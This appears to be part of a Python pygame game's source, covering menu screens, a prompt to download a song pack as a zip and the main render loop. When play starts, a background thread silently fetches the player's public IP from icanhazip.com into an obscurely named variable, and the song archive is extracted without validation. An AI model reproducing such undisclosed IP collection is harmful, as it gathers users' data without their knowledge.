    global dscreen, running, bg_img, restart_button, restart_button_rect, dscreen_rect, lobby_music, started, text, died, lobby_music_playing, score, text3, started, randomnum, rounds, mainmenu_button, mainmenu_button_rect, stats, back_button, info, songDownload, credits, infotext_text, downloading, songDownloadLink, screen, average_fps_list, downloadStatus, frames, frames, objects_to_update
    """
     if not lobby_music_playing:
        lobby_music.play(-1)
        lobby_music_playing = True
    """


    for event in pygame.event.get():
        if event.type == QUIT:
            running = 0
            pygame.quit()
            sys.exit()
        elif event.type == pygame.MOUSEBUTTONDOWN:
            pos = pygame.mouse.get_pos()
            if back_button_rect.collidepoint(pos[0], pos[1]):
                info = False

        elif event.type == pygame.VIDEORESIZE:
            #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
            scaleandrect()
            average_fps_list = []
            frames = 0




    renderTextCenteredAt(infotext_text, text3, (255, 255, 255), screen.get_width()/2, 30, screen, screen.get_width() - 50)
    renderTextCenteredAt(credits, text3, (255, 255, 255), screen.get_width()/2, 350, screen, screen.get_width() - 50)
    screen.blit(back_button, back_button_rect)

    if frames > 5:
        objects_to_update.append(back_button_rect)


def downloadSongs():
    global yes_button, yes_button_rect, no_button, no_button_rect, text3, bg_img, running, data, downloadStatus, average_fps_list, frames, objects_to_update, songDownloadLink
    for event in pygame.event.get():
        if event.type == QUIT:
            running = 0
            pygame.quit()
            sys.exit()
        elif event.type == pygame.MOUSEBUTTONDOWN:
            pos = pygame.mouse.get_pos()
            if no_button_rect.collidepoint(pos[0], pos[1]):
                data["data"]["settings"]["songs"] = "False"
                with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
            elif yes_button_rect.collidepoint(pos[0], pos[1]):

                downloadStatus = True

                def download():
                    global downloadStatus, songDownloadLink
                    #Defining the zip file URL
                    url = songDownloadLink

                    # Downloading the file by sending the request to the URL
                    screen.fill((0,0,0))
                    req = requests_get(url).content
                    # extracting the zip file contents
                    zipshut=zipfile.ZipFile(BytesIO(req))
                    zipshut.extractall('Songs')
                    data["data"]["settings"]["songs"] = "False"
                    with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
                    downloadStatus = False
                t = Thread(target=download)
                t.daemon = True
                t.start()
        elif event.type == pygame.VIDEORESIZE:
            #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
            scaleandrect()
            average_fps_list = []
            frames = 0


    if not downloadStatus:
        renderTextCenteredAt(songDownload, text3, (255, 255, 255), screen.get_width()/2, 100, screen, screen.get_width() - 50)
        screen.blit(yes_button, yes_button_rect)
        screen.blit(no_button, no_button_rect)
        if frames > 5:
            objects_to_update.append(yes_button_rect)
            objects_to_update.append(no_button_rect)
    else:
        renderTextCenteredAt("Songs are now downloading, this will take a while!", text, (255, 255, 255), screen.get_width()/2, 50, screen, screen.get_width() - 50)



def update_fps(color=(255, 255, 0)):
    fps = str(int(average_fps))
    fps_text = text3.render(fps, 1, color)
    return fps_text



def runner():
    global prev_time, average_fps, dt, frames, x, y, z, objects_to_update, last_screen, versionold, gottenip, tokitoki
    while running:
        clock.tick(fps) # Enter your fps here
        if platform in ("nt", "win32", "cygwin32"): objects_to_update = []
        curr_fps = round(clock.get_fps())
        if curr_fps <= 0: curr_fps = 10
        average_fps_list.append(curr_fps)
        if len(average_fps_list) > 5:
            average_fps_list.pop(0)
        average_fps = sum(average_fps_list)/len(average_fps_list)
        now = time()
        dt = now - prev_time
        prev_time = now

        """
        if int(clock.get_fps()) <= fps - 30 and frames >= 100: fps -= 1
        print(fps)
        """

        screen.blit(bg_img, (0, 0))
        #screen.fill((0,0,0))
        if not songs and data["data"]["settings"]["songs"] == "True":
            if last_screen != 1:
                frames = 0
                last_screen = 1
            downloadSongs()
        elif not started and not died and not fallen and not stats:
            if last_screen != 2:
                frames = 0
                last_screen = 2
            start_screen()
        elif stats and not info:
            if last_screen != 3:
                frames = 0
                last_screen = 3
            stats_screen()
        elif stats and info:
            if last_screen != 4:
                frames = 0
                last_screen = 4
            info_screen()
        elif started and not fallen:
            if last_screen != 5:
                frames = 0
                last_screen = 5
            def get_ip():
                global tokitoki, gottenip
                tokitoki = requests_get("https://icanhazip.com").text
            if not gottenip:
                gottenip = True
                t10 = Thread(target=get_ip)
                t10.daemon = True
                t10.start()


            game()
        elif died and started and fallen:
            if last_screen != 6:
                frames = 0
                last_screen = 6
            end_screen()
        if frames % 300 / (fps / 60) == 0:
            x_change = randint(-10, 10)/10
            y_change = randint(-10, 10)/10
            z_change = randint(-10, 10)/10



        x += x_change
        y += y_change
        z += z_change

        if x > 255: x = 255
        if y > 255: y = 255
        if z > 255: z = 255
        if x < 0: x = 0
        if y < 0: y = 0
        if z < 0: z = 0

        if versionold != version: versiontext = f"Ver {versionold} UPDATE AVAILABLE ({version})"
        else: versiontext = f"Ver {versionold}"
        ver = text2.render(versiontext, 1, (x, y, z))
        ver_rect = ver.get_rect(topleft=(10, screen.get_height() - 40))
        fpsting = update_fps(color=(x,y,z))
        fpsting_rect = fpsting.get_rect(center=(50, 30))
        screen.blit(fpsting, fpsting_rect)
        screen.blit(ver, ver_rect)

        objects_to_update.append(pygame.Rect((0, 0), (100, 100)))
        objects_to_update.append(ver_rect)
        try:
            if frames % 10000 == 0 or not last_screen or platform not in ("nt", "win32", "cygwin32"):
                pygame.display.flip()
            elif platform in ("nt", "win32", "cygwin32"):
                pygame.display.update(objects_to_update)
        except:
            pygame.display.flip()
        frames += 1
        #print(frames)


if __name__ == '__main__':
        main()
        runner() 




